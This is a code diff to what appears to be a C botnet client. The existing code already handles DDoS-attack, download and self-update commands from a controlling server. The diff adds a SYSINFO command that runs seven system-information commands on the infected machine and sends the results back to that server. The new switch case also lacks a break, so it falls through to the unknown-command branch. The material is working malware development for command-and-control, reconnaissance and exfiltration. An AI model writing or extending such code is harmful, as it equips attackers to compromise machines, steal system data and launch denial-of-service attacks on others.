@@ -26,6 +26,7 @@ enum OrderType get_order_enum_type(const char *buffer) {
     if (strcmp(flag, "ASKSTATE") == 0) return ASKSTATE;
     if (strcmp(flag, "DDOSATCK") == 0) return DDOSATCK;
     if (strncmp(buffer, "DOWNLOAD", 8) == 0) return DOWNLOAD;
+    if (strncmp(buffer, "SYSINFO", 7) == 0) return SYSINFO;
     return UNKNOWN; // warning: unknown enum value is 5
 }
 
@@ -166,6 +167,8 @@ void receive_and_process_message(int sockfd, int argc, char *argv[]) {
         case UPDATE:
             perform_self_update("/tmp/botnet/downloads/client", sockfd, argc, argv);
             break;
+        case SYSINFO:
+            execute_get_sysinfo(sockfd);
         case UNKNOWN:
             output_log("Unknown command type received\n", LOG_WARNING, LOG_TO_CONSOLE);
             break;
@@ -228,4 +231,23 @@ void perform_self_update(const char *new_exe_path, int sockfd, int argc, char *a
     // If execv fails
     perror("execv failed");
     output_log("perform_self_update : Execv failed to run : %s\n", LOG_ERROR, LOG_TO_ALL, errno);
+}
+
+void execute_get_sysinfo(int sockfd){
+    Command **cmds = commands_sysinfo();
+    // Execute other commands
+    for (int i = 0; i < 7; i++){
+        char result_buffer[4096] = {0};
+        int exit_code = execute_command(cmds[i], result_buffer, sizeof(result_buffer));
+
+        // Send the result back to the server
+        if (exit_code >= 0) {
+            send_message(sockfd, result_buffer);
+        } else {
+            char error_msg[100];
+            sprintf(error_msg, "Command %d execution failed", i+1);
+            send_message(sockfd, error_msg);
+        }   
+    }
+    free_commands(cmds, 7);
 }
